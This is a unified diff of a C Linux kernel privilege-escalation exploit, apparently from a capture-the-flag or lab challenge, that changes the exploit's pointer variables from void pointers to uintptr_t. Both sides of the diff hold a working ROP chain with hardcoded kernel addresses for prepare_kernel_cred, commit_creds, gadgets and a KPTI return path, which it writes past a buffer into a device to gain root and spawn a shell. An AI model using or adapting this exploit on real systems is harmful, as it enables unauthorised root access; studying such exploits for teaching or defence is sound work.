@@ -1,20 +1,21 @@
 #include <fcntl.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-void *cs;
-void *rflags;
-void *rsp;
-void *ss;
+uintptr_t cs;
+uintptr_t rflags;
+uintptr_t rsp;
+uintptr_t ss;
 
-void *(*prepare_kernel_cred)(void *)	= (void *)0xffffffff8106e240;
-int (*commit_creds)(void *)		= (void *)0xffffffff8106e390;
+uintptr_t prepare_kernel_cred	= 0xffffffff8106e240;
+uintptr_t commit_creds		= 0xffffffff8106e390;
 
-void *pop_rdi_xor_al_0_ret		= (void *)0xffffffff812abdfd;
-void *pop_rcx_xor_al_0_ret		= (void *)0xffffffff812ac83f;
-void *mov_rdi_rax_rep_movsq		= (void *)0xffffffff8160c96b;
-void *kpti				= (void *)0xffffffff81800e26;
+uintptr_t pop_rdi_xor_al_0_ret	= 0xffffffff812abdfd;
+uintptr_t pop_rcx_xor_al_0_ret	= 0xffffffff812ac83f;
+uintptr_t mov_rdi_rax_rep_movsq	= 0xffffffff8160c96b;
+uintptr_t kpti			= 0xffffffff81800e26;
 
 static void save_state(void)
 {
@@ -36,7 +37,7 @@ static void shell(void)
 int main(void)
 {
 	unsigned char data[0x500] = { 0 };
-	void **rop_chain;
+	uintptr_t *rop_chain;
 	int fd;
 
 	save_state();
@@ -47,23 +48,23 @@ int main(void)
 		return EXIT_FAILURE;
 	}
 
-	rop_chain = (void **)&data[0x408];
+	rop_chain = (uintptr_t *)&data[0x408];
 	*rop_chain++ = pop_rdi_xor_al_0_ret;
-	*rop_chain++ = NULL;
+	*rop_chain++ = (uintptr_t)NULL;
 	*rop_chain++ = prepare_kernel_cred;
 	*rop_chain++ = pop_rcx_xor_al_0_ret;
 	*rop_chain++ = 0;
 	*rop_chain++ = mov_rdi_rax_rep_movsq;
 	*rop_chain++ = commit_creds;
 	*rop_chain++ = kpti;
-	*rop_chain++ = NULL;
-	*rop_chain++ = NULL;
-	*rop_chain++ = shell;
+	*rop_chain++ = (uintptr_t)NULL;
+	*rop_chain++ = (uintptr_t)NULL;
+	*rop_chain++ = (uintptr_t)shell;
 	*rop_chain++ = cs;
 	*rop_chain++ = rflags;
 	*rop_chain++ = rsp;
 	*rop_chain++ = ss;
-	write(fd, data, (void *)rop_chain - (void *)data);
+	write(fd, data, (uintptr_t)rop_chain - (uintptr_t)data);
 
 	close(fd);
 	return EXIT_SUCCESS;
